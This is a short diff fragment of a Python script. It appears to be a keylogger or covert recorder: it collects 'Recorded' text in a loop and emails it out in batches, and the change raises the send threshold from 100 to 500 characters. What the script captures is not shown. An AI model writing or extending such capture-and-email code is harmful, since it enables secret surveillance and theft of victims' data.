@@ -29,7 +29,7 @@ while True:
         else:
             Text = Text + Recorded
 
-    if (len(Text)>=100): 
+    if (len(Text)>=500): 
         try:
             msg = MIMEMultipart()
             password="contraseña/password"
